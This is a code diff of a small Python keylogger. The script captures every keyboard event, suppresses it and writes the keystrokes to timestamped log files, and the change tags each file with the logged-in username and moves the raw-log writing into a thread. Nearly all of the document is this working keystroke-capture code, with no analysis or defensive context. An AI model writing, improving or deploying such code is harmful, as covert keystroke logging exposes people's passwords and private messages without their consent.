@@ -2,9 +2,9 @@ from lib import keyboard
 from datetime import datetime
 import os
 import threading
+import getpass
 
 #gloabl var
-
 
 def checkLogsPath(path):
     if os.path.exists(path) == False:
@@ -12,18 +12,13 @@ def checkLogsPath(path):
 
 def recording():
     return keyboard.read_event(suppress=True)
-    
-
-def calcualteDataAndHour():
-    tempTime = datetime.now()
-    return str(tempTime.strftime("%Y-%m-%d %H.%M.%S"))
 
 def writeToFileRaw(lPath, lName, l):
     newLog = open(lPath + lName, "a")
     newLog.write(str(l))
     newLog.close()
 
-def writeToFileHuman(strh, lPath, lName):
+def writeToFileHuman(lPath, lName, strh):
     if strh.find("down") != -1:
         if strh.find("space") != -1:
             strh = " "
@@ -49,7 +44,7 @@ def writeToFileHuman(strh, lPath, lName):
     newLog.close()
 
 def main():
-    tempLogName = calcualteDataAndHour()
+    tempLogName = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + "_" + getpass.getuser()
     logsPath = "logs/"
     checkLogsPath(logsPath)
 
@@ -57,12 +52,10 @@ def main():
         tempLog = recording()
         strh = str(tempLog)
 
-        writeToFileRaw(logsPath,tempLogName+".raw",strh + "\n")
-
-        thread_write_human = threading.Thread(target=writeToFileHuman, args=(strh + "\n", logsPath, tempLogName+".txt"))
+        thread_write_raw = threading.Thread(target=writeToFileRaw, args=(logsPath,tempLogName+".raw",strh + "\n"))
+        thread_write_raw.start()
+        thread_write_human = threading.Thread(target=writeToFileHuman, args=(logsPath, tempLogName+".txt", strh + "\n"))
         thread_write_human.start()
-
-
 
 #########################
 if __name__== "__main__":
